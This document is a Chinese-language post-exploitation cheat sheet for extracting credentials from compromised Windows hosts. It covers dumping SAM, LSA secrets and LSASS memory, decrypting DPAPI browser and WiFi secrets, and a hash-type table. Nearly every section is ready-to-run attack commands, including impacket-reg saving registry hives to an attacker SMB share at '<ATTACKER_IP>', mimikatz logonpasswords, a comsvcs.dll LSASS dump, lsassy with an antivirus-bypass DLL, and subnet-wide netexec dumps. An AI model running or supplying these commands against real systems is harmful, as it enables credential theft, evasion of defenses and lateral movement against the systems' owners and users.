# 凭据提取技术详解

在获得目标主机管理员权限 (`Pwn3d!`) 后，从不同位置提取凭据用于进一步横向移动。

---

## SAM 数据库

SAM (Security Account Manager) 存储本地用户的 NTLM 哈希。

位置: `C:\Windows\System32\config\SAM` (需要 SYSTEM 权限访问)

### 远程提取 (impacket-secretsdump)

```bash
# 使用密码
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>'

# 使用 NTLM Hash
impacket-secretsdump -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET_IP>'

# 使用 Kerberos 票据
export KRB5CCNAME=<USER>.ccache
impacket-secretsdump -k -no-pass '<TARGET_FQDN>'
```

### 本地提取 (reg save)

```powershell
# 在目标机器上导出注册表
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

```bash
# 传回攻击机后离线解密
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 远程 reg save (impacket-reg)

```bash
# 远程导出到攻击机 SMB 共享
impacket-smbserver -smb2support share .

impacket-reg '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>' save \
  -keyName 'HKLM\SAM' -o '\\<ATTACKER_IP>\share'
impacket-reg '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>' save \
  -keyName 'HKLM\SYSTEM' -o '\\<ATTACKER_IP>\share'

impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 批量提取 (netexec)

```bash
# 对子网内所有 Pwn3d 主机批量 SAM dump
netexec smb <SUBNET>/24 -u '<USER>' -H '<NT_HASH>' --sam
```

### Hash 格式

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

- `aad3b435b51404eeaad3b435b51404ee` = 空 LM Hash (现代系统不存储 LM)
- NT Hash 用于 Pass the Hash

---

## LSA Secrets

LSA Secrets 存储服务账号密码、缓存的域凭据、机器账户密钥等敏感信息。

位置: `C:\Windows\System32\config\SECURITY`

### 远程提取

```bash
# secretsdump 会同时提取 SAM + LSA
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>'

# 批量 LSA dump
netexec smb <SUBNET>/24 -u '<USER>' -H '<NT_HASH>' --lsa
```

### 远程 reg save + 离线解密

```bash
impacket-reg '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>' save \
  -keyName 'HKLM\SECURITY' -o '\\<ATTACKER_IP>\share'
impacket-reg '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>' save \
  -keyName 'HKLM\SYSTEM' -o '\\<ATTACKER_IP>\share'

impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

### 输出内容

**1. 缓存的域凭据 (DCC2)**

```
DOMAIN/cached_user:$DCC2$10240#cached_user#a8f2e...
```

- 域用户登录后缓存在本地，用于离线时认证
- Hashcat mode 2100 破解 (极慢)
- 默认缓存最近 10 个域用户

```bash
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt
```

**2. 服务账号密码 (明文)**

```
_SC_MSSQL$SQLEXPRESS
  domain\sql_svc:ClearTextServicePassword
_SC_BackupExec
  domain\svc_backup:BackupPassword123
```

- 以 `_SC_` 前缀标识的是 Windows 服务关联的账户
- 直接获得明文密码，可立即用于横向移动

**3. 机器账户 ($MACHINE.ACC)**

```
$MACHINE.ACC:
  aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
  aes256-cts-hmac-sha1-96:<AES256_KEY>
  plain_password_hex:<HEX_PASSWORD>
```

- 可用于 LDAP 查询 (以机器账户身份)
- 可用于 Silver Ticket 攻击

---

## LSASS 内存提取

LSASS (Local Security Authority Subsystem Service) 进程在内存中保存当前登录用户的凭据。

### mimikatz (本地执行)

```powershell
# 提取所有登录凭据
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

输出包含:
- NTLM Hash
- 明文密码 (WDigest 启用时)
- Kerberos 票据

### comsvcs.dll MiniDump (LOLBin)

利用系统自带 DLL 转储 LSASS，无需上传额外工具:

```powershell
# 获取 LSASS PID
$pid = (Get-Process lsass).Id

# 使用 comsvcs.dll 转储 (需要 SYSTEM 权限)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\temp\lsass.dmp full
```

```bash
# 传回攻击机后用 pypykatz 解析
pypykatz lsa minidump lsass.dmp
```

### procdump (Sysinternals)

```powershell
# 使用 procdump 转储 LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### lsassy (远程提取)

纯远程操作，无需登录目标:

```bash
# 基本用法 (可能被 Defender 拦截)
netexec smb <TARGET> -u '<USER>' -p '<PASSWORD>' -M lsassy

# 使用 dumpertdll 绕过 AV
lsassy -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' <TARGET> \
  -m dumpertdll -O dumpertdll_path=Outflank-Dumpert-DLL.dll

# 使用 Hash
lsassy -d '<DOMAIN>' -u '<USER>' -H '<NT_HASH>' <TARGET>
```

输出:

```
DOMAIN\user01 [NT] cba36eccfd9d949c73bc73715364aff5
DOMAIN\user01 [SHA1] a4f2b6c8d...
DOMAIN\admin  [TGT] Domain: DOMAIN - End time: 2025-04-24 (ticket.kirbi)
```

### 重要注意

- 仅能捕获**当前登录用户**的凭据
- 内存是易失性的，用户注销或重启后凭据消失
- 现代 Defender 会拦截 LSASS 访问，通常需要绕过

---

## donpapi: 批量凭据提取

donpapi 利用 DPAPI 远程解密浏览器密码、WiFi 密码、凭据管理器等。

```bash
# 基本用法
donpapi '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'

# 使用 Hash
donpapi -hashes ':<NT_HASH>' '<DOMAIN>/<USER>@<TARGET>'

# 批量
donpapi '<DOMAIN>/<USER>:<PASSWORD>@<TARGET1>,<TARGET2>,<TARGET3>'
```

提取内容:
- Chrome/Edge 保存的密码和 Cookie
- WiFi 密码
- Windows 凭据管理器
- 证书私钥
- Remote Desktop (.rdg) 保存的密码

---

## pypykatz: 纯 Python mimikatz

无需在目标上执行 mimikatz，纯 Python 实现:

```bash
# 解析 LSASS dump 文件
pypykatz lsa minidump lsass.dmp

# 解析 SAM/SYSTEM/SECURITY 注册表文件
pypykatz registry --sam SAM --system SYSTEM --security SECURITY

# 解析 NTDS.dit
pypykatz ntds -s SYSTEM ntds.dit
```

---

## Hash 类型速查

| 类型 | 来源 | 用途 | Hashcat mode |
|------|------|------|-------------|
| NT (NTLM) | SAM / LSASS | Pass the Hash | 1000 |
| LM | SAM (遗留) | 通常为空 | 3000 |
| DCC2 | LSA Secrets | 仅离线破解 (极慢) | 2100 |
| NetNTLMv1 | 网络捕获 | Relay 或破解 | 5500 |
| NetNTLMv2 | 网络捕获 | Relay 或破解 | 5600 |
| AS-REP | Kerberos | 离线破解 | 18200 |
| TGS-REP | Kerberos | 离线破解 | 13100 |
